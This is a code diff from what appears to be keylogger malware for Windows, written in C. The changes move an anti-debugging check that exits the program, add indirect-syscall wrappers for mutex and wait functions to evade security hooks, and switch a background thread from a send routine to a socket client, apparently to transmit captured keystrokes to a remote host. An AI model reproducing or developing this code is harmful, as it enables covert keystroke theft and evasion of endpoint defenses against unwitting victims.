@@ -11,6 +11,12 @@
 #include "sender/sender.h"
 
 
+void isDebuggerModeOn() {
+    if (_checkDebugger() != 0) {
+        exit(0);
+    }
+}
+
 DWORD getProcessPID(const char* processName) {
     PROCESSENTRY32 entry;
     entry.dwSize = sizeof(PROCESSENTRY32);
@@ -42,12 +48,6 @@ VOID IndirectPrelude(HMODULE NtdllHandle, char NtFunctionName[], PDWORD NtFuncti
     *NtFunctionSyscall = NtFunctionAddress + 0x12;
 
     if (memcmp(SyscallOpcodes, (PVOID)*NtFunctionSyscall, sizeof(SyscallOpcodes)) != 0) {
-        exit(0);
-    }
-}
-
-void isDebuggerModeOn() {
-    if (_checkDebugger() != 0) {
         exit(0);
     }
 }
@@ -107,6 +107,9 @@ int main() {
 
     IndirectPrelude(NtdllHandle, "NtCreateThreadEx", &g_NtCreateThreadExSSN, &g_NtCreateThreadExSyscall);
     IndirectPrelude(NtdllHandle, "NtClose", &g_NtCloseSSN, &g_NtCloseSyscall);
+    IndirectPrelude(NtdllHandle, "NtCreateMutant", &g_NtCreateMutantSSN, &g_NtCreateMutantSyscall);
+    IndirectPrelude(NtdllHandle, "NtReleaseMutant", &g_NtReleaseMutantSSN, &g_NtReleaseMutantSyscall);
+    IndirectPrelude(NtdllHandle, "NtWaitForSingleObject", &g_NtWaitForSingleObjectSSN, &g_NtWaitForSingleObjectSyscall);
 
     KeysCombinations* combinations = createCombinationTable();
     PressedKeys* pressedKeys = createTablePK();
@@ -128,9 +131,10 @@ int main() {
 
     LPBYTE tempUserId = getOrCreateAndGetUserId();
     wcstombs(userId, (wchar_t*)tempUserId, 37 * sizeof(char));
+
     strcpy(result, "");
 
-    Status = NtCreateThreadEx(&thread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), (long int (*)(void *))send_, NULL, FALSE, 0, 0, 0, NULL);
+    Status = NtCreateThreadEx(&thread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), (long int (*)(void *))initSocketClient, NULL, FALSE, 0, 0, 0, NULL);
     if (STATUS_SUCCESS != Status) {
         State = FALSE; goto CLEANUP;
     }
